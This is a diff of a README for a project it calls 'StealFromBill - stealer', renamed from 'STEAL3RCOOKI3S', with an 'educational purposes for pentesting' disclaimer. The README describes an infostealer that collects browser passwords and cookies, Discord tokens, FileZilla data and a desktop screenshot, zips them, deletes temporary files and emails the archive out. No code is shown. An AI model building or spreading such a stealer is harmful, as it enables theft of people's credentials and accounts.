@@ -1,6 +1,6 @@
-# STEAL3RCOOKI3S
+# StealFromBill - stealer
 
-ATTENTION!The author does not encourage the theft of personal data, passwords and cookies using this script.This script is written for educational purposes for pentesting.
+# ATTENTION!The author does not encourage the theft of personal data, passwords and cookies using this script.This script is written for educational purposes for pentesting.
 
 This script is a stealer designed to extract passwords, cookies from browsers, Discord tokens, FileZilla data, and a screenshot of the desktop. Data about the script’s operation is saved in log.txt, and temporary files are deleted. After the script packs all the data from the computer into a ZIP archive, it will automatically send the file to an email address (see file "usage"  for email configuration)
 
